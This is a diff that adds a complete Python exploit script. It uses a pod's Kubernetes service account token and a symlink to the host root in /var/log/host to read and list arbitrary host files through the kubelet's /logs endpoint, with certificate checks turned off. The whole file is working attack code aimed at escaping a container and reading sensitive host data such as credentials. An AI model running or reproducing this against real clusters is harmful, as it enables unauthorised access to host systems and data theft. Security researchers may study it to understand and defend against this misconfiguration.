@@ -1,0 +1,72 @@
+#!/usr/bin/env python
+import os
+import sys
+import requests
+import urllib3
+import netifaces
+from bs4 import BeautifulSoup
+import fnmatch
+import re
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_default_gateway():
+    return netifaces.gateways()['default'][netifaces.AF_INET][0]
+
+LOGS_URL = "https://{}:10250/logs".format(get_default_gateway())
+HOST_FS_BASE = LOGS_URL+"/root_link" 
+
+def attach_to_root():
+    os.symlink("/", "/var/log/host/root_link")
+
+def detach_from_root():
+    os.remove("/var/log/host/root_link")
+
+def read_folder(path):
+    soup = BeautifulSoup(s.get(HOST_FS_BASE+path).text, 'html.parser')
+    for link in soup.find_all('a'):
+        href = link.get('href')
+        if href:
+            yield href
+
+def cat(path):
+    if path.endswith('/'):
+        print('error: {} is a directory'.format(path))
+        return
+    try:
+        attach_to_root()
+        print(str(s.get(HOST_FS_BASE+path).content))
+    except Exception as x: 
+        print("ERROR: {}".format(x))
+    finally:
+        detach_from_root()
+
+def ls(path):
+    try:
+        attach_to_root()
+        print('\n'.join(read_folder(path)))
+    except Exception as x: 
+        print("ERROR: {}".format(x))
+    finally:
+        detach_from_root()
+
+def main():
+    {"lsh": ls,"cath": cat}.get(sys.argv[1], lambda x: usage())(sys.argv[2])
+
+def usage():
+    print("Usage: [cath|lsh] <host_path>")
+    sys.exit(1)
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        usage()
+    with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as tf:    
+        token = tf.read()
+    s = requests.session()
+    s.verify = False
+    s.headers.update({"Authorization": "Bearer {}".format(token)})
+    if s.get(LOGS_URL).status_code != 200:
+        print("[-] Cannot run exploit, no permissions to access /logs on the kubelet")
+        sys.exit(1)
+
+    main()
